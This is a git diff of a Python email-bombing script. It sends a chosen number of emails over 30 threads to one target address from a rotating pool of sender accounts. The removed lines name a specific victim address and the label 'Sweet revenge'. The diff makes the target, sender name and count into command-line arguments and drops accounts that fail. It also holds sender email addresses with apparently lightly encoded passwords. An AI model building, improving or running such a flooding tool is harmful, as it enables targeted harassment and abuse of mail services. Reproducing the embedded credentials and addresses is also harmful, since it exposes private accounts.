@@ -2,14 +2,15 @@ import smtplib, socket, sys, os, time
 from random import randrange
 import threading as t
 
-name = "Sweet revenge"
 emails = {"sceet421@gmail.com":"fwbodppm",
-          "sceet422@gmail.com":"fwbotdffu533",
+          #"sceet422@gmail.com":"fwbotdffu533",
           #"evanalekseyev@gmail.com":"fwbodppm",
-          "arandomperson4206969@gmail.com":"jepoufwfolopx21"}
+          "arandomperson4206969@gmail.com":"jepoufwfolopx21"
+          }
 subject = ""
-target = "alexzhu23@mittymonarch.com"
-reps = 100
+name = sys.argv[2] #"Sweet revenge"
+target = sys.argv[1] #"alexzhu23@mittymonarch.com"
+reps = int(sys.argv[3]) #100
 threads = 30
 
 # generate empty list (for thread array)
@@ -57,7 +58,7 @@ def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
         server.login(sent_from, sent_from_pass)
         server.sendmail(sent_from, [to_email], email_text)
         server.close()
-        print('Email ' + str(count) + ' sent on try ' + str(num))
+        print('Email ' + str(count) + ' sent from ' + sent_from + ' on try ' + str(num))
         count += 1
     except Exception as e:
         # try sending again after short sleep
@@ -67,14 +68,24 @@ def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
         #if it has been trying for some time, print error
         else:
             print(e)
+            emails.pop(list(emails.keys()).index(sent_from))
+            main(name,
+                 list(emails.keys())[randrange(len(list(emails.keys())))],
+                 list(emails.values())[randrange(len(list(emails.values())))],
+                 target)
 
 if __name__ == "__main__":
     startTime = time.time()
     p = returnNone(threads)
     if reps <= threads:
         for i in range(reps):
-            p[i] =  t.Thread(target=main)
+            p[i] = t.Thread(target=main,
+                            args=[name,
+                                  list(emails.keys())[reps % len(list(emails.keys()))],
+                                  list(emails.values())[reps % len(list(emails.values()))],
+                                  target])
             p[i].start()
+            reps -= 1
         for i in range(reps):
             p[i].join()
 
